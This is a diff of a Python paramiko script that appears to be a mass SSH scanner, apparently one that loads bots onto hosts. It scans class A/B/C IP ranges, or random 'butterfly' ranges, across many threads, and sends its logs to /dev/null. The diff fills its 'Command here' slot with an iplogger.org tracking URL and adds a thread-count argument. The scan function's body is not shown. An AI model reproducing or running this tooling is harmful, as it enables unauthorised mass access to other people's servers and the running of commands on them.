@@ -6,19 +6,26 @@ import paramiko
 import warnings
 import threading
 
-cmd = "" # Command here
+cmd = "https://iplogger.org/2VK6Q5" # Command here
 
 paramiko.util.log_to_file("/dev/null")
 warnings.filterwarnings(action="ignore", module=".*paramiko.*")
 
-choice = sys.argv[1].lower()
+if len(sys.argv) < 3:
+	print("Incorrect usage!")
+	print("If choice is butterfly don't include a range")
+	print("Usage: python {} [Threads] [Choice(A/B/C/Butterfly)] [Range]".format(sys.argv[0]))
+	sys.exit()
+
+threads = int(sys.argv[1])
+choice = sys.argv[2].lower()
 
 if choice == "a":
-	range1 = sys.argv[2]
+	range1 = sys.argv[3]
 elif choice == "b":
-	range1, range2 = sys.argv[2].split(".")
+	range1, range2 = sys.argv[3].split(".")
 elif choice == "c":
-	range1, range2, range3 = sys.argv[2].split(".")
+	range1, range2, range3 = sys.argv[3].split(".")
 elif choice == "butterfly":
 	pass
 else:
@@ -93,7 +100,7 @@ def scan():
 		except:
 			pass
 
-for i in range(100):
+for i in range(threads):
 	threading.Thread(target=scan, daemon=True).start()
 
 while True:
